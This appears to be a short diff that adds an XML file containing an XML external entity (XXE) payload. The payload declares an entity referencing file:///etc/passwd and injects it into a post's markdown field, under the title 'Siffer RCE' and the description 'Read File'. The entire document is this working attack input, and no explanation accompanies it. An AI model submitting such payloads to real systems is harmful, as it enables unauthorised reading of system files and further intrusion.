@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+
+<post>
+	<title>Siffer RCE</title>
+	<description>Read File</description>
+	<markdown>&file;</markdown>
+</post>
+
